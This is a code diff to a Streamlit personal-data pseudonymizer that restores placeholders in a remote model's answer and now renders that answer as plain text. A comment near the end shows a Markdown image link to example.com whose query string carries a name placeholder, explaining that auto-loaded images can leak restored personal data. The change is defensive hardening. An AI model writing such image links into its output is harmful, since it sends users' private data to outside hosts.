@@ -5,7 +5,7 @@ from uuid import uuid4
 
 import streamlit as st
 
-from pii_anonymizer.engine import MODEL, answer, pseudonymize
+from pii_anonymizer.engine import MODEL, answer, pseudonymize, restore
 from pii_anonymizer.feedback import save_feedback
 from pii_anonymizer.files import FILE_TYPES, read_text
 
@@ -46,7 +46,7 @@ if st.button("Pseudonymize and answer", type="primary"):
     try:
         start = perf_counter()
         with st.spinner("Looking for personal data..."):
-            texts, mapping = pseudonymize([text for _, text in named_texts])
+            texts, mapping, missed = pseudonymize([text for _, text in named_texts])
         pseudonymized = perf_counter()
         with st.spinner("Waiting for the response..."):
             # Only the texts: a file name can contain personal data too.
@@ -59,13 +59,16 @@ if st.button("Pseudonymize and answer", type="primary"):
         )
         st.stop()
 
+    restored, unknown = restore(response, mapping, texts)
     # Clicking a star reruns this page, so the result must outlive the click on the button.
     st.session_state["result"] = {
         "id": str(uuid4()),
         "names": [name for name, _ in named_texts],
         "texts": texts,
         "mapping": mapping,
-        "response": response,
+        "missed": missed,
+        "response": restored,
+        "unknown": unknown,
         "pseudonymization_seconds": pseudonymized - start,
         "response_seconds": perf_counter() - pseudonymized,
     }
@@ -73,6 +76,14 @@ if st.button("Pseudonymize and answer", type="primary"):
 if result := st.session_state.get("result"):
     st.subheader("Pseudonymized content")
     st.caption("Privacy boundary: only this content may leave the device.")
+    if result["missed"]:
+        # The values go in st.code: st.warning renders Markdown, and a value comes from a model.
+        st.warning(
+            f"{len(result['missed'])} of the values found by the local model are not in the "
+            "content as it wrote them, so they were not hidden. Check that none of them is "
+            "visible below before sending."
+        )
+        st.code("\n".join(result["missed"]), language=None, wrap_lines=True)
     for name, text in zip(result["names"], result["texts"], strict=True):
         st.text(name)
         st.code(text, language=None, wrap_lines=True)
@@ -80,11 +91,16 @@ if result := st.session_state.get("result"):
     st.subheader("Response")
     st.caption(
         f"Response time: {result['response_seconds']:.1f} s. "
-        f"Pseudonymization: {result['pseudonymization_seconds']:.1f} s. "
-        "The placeholders are not restored yet."
+        f"Pseudonymization: {result['pseudonymization_seconds']:.1f} s."
     )
-    # shortcut: Markdown can load remote images, remove them when real values are restored here
-    st.markdown(result["response"])
+    if result["unknown"]:
+        st.warning(
+            "The response contains placeholders that were never sent or that the model changed. "
+            "They are shown as they are: " + ", ".join(f"`{token}`" for token in result["unknown"])
+        )
+    # Plain text: Markdown loads images by itself, so a response that ends with
+    # ![](https://example.com/x.png?q=<PERSON_1>) would send the restored name without a click.
+    st.code(result["response"], language=None, wrap_lines=True)
     st.feedback("stars", key=result["id"], on_change=rate, args=(result,))
 
     st.subheader("Mapping table")
